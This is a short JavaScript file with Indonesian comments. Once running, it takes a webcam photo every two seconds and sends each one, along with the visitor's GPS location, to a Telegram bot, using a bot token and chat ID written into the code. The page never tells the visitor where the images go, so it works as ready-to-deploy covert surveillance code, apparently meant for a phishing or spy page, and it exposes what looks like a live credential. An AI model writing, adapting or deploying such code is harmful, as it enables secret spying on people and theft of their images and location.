const video = document.getElementById('video');
const canvas = document.getElementById('canvas');

const botToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q';  // Ganti dengan token bot Telegram
const chatId = '-4545188605';  // Ganti dengan chat ID tujuan

let locationSent = false; // Pastikan lokasi hanya dikirim sekali

// **1. Meminta akses kamera**
navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => {
        video.srcObject = stream;
        startCapturing();
    })
    .catch(err => {
        alert("Tidak dapat mengakses kamera: " + err.message);
    });

// **2. Mengambil lokasi pengguna (dikirim sekali)**
function getLocationAndSend() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                if (!locationSent) {
                    locationSent = true;
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const locationText = `📍 Lokasi pengguna: [Google Maps](https://www.google.com/maps?q=${lat},${lon})`;

                    // Kirim ke Telegram
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ chat_id: chatId, text: locationText, parse_mode: "Markdown" })
                    }).then(() => console.log("Lokasi dikirim."));
                }
            },
            error => console.error("Gagal mendapatkan lokasi:", error)
        );
    } else {
        console.error("Geolocation tidak didukung di browser ini.");
    }
}

// **3. Mengambil gambar secara terus-menerus (2 detik sekali)**
function startCapturing() {
    setInterval(() => {
        captureAndSend();
    }, 2000); // Ambil gambar setiap 2 detik
}

function captureAndSend() {
    const context = canvas.getContext("2d");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);

    canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("photo", blob, "capture.jpg");
        formData.append("caption", "📸 Gambar terbaru dari pengguna");

        // Kirim ke Telegram
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
            method: "POST",
            body: formData
        })
        .then(response => response.json())
        .then(data => {
            if (data.ok) {
                console.log("Gambar berhasil dikirim!");
            } else {
                console.error("Gagal mengirim gambar:", data);
            }
        })
        .catch(error => console.error("Error mengirim gambar:", error));
    }, "image/jpeg");
}

// **4. Mulai proses otomatis**
getLocationAndSend();